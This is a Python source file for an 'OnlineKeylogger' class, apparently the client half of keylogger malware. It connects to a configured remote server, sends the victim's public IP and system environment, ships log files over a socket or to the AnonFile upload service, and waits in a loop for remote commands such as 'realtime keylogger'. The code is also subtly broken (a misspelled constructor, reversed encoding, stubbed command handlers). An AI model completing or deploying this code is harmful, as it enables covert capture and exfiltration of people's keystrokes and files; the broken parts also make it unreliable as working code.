import socket
from anonfile import AnonFile

from src.functions.listener import *
from src.encryption.encryptionsys import *
import shutil
import requests
import os


class OnlineKeylogger:
    def __int__(self, config):
        self.port = config["port"]
        self.ip = config["ip"]
        self._DEFAULT_SIZE = 1024
        self._ENCODING_FORMAT = "UTF-8"
        self.socket = socket.socket()
        self.client = socket.socket

    def send(self, args, encode):
        return self.socket.send(bytes(args).decode(encode))

    def recv(self, size, encode):
        if encode is not None:
            receive = self.client.recv(size).decode(encode)
        else:
            receive = self.client.recv(size)

        return receive

    def transfer(self, file):
        file_size = os.path.getsize(file)

        self.send(str(file_size), self._ENCODING_FORMAT)
        logs = open(file, "rb")
        file_bytes = logs.read(file_size)
        while True:
            if bytes:
                self.client.send(file_bytes)
                logs.close()
                break
            else:
                break

    def anonfile(self, file):
        anon = AnonFile()
        upload = anon.upload(file)
        return upload.url.geturl()

    def connectionHandle(self):
        try:
            print("Connecting to a server")
            self.client.connect((self.ip, self.port))

        except TimeoutError:
            return self.connectionHandle()

        target_ip = requests.get("https://checkip.amazonaws.com").text.strip()
        target_system = os.getenv()
        self.client.send(bytes(target_ip, self._ENCODING_FORMAT))
        self.client.send(bytes(target_system, self._ENCODING_FORMAT))

        while True:
            command = self.recv(self._DEFAULT_SIZE, self._ENCODING_FORMAT)
            if command == "transfer":
                pass
            elif command == "upload file":
                pass
            elif command == "realtime keylogger":
                pass
